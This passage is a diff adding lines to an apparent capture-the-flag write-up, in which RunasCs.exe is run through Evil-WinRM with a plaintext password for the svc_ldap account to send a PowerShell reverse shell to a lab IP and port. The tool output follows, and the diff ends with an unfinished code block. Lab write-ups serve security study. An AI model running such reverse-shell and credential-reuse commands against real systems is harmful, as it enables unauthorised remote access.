@@ -303,3 +303,15 @@ Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload runascs/RunasCs.exe
 ```
 Now its on the system i can use this to execute powershell commands via evil-winrm as svc_ldap
 
+```python
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ./RunasCs.exe svc_ldap 'M1XyC9pW7qT5Vn' powershell -r 10.10.14.90:1337
+[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-3097ac$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6356 created in background.
+```
+Ill get a session as `svc_ldap`
+
+```p
+```
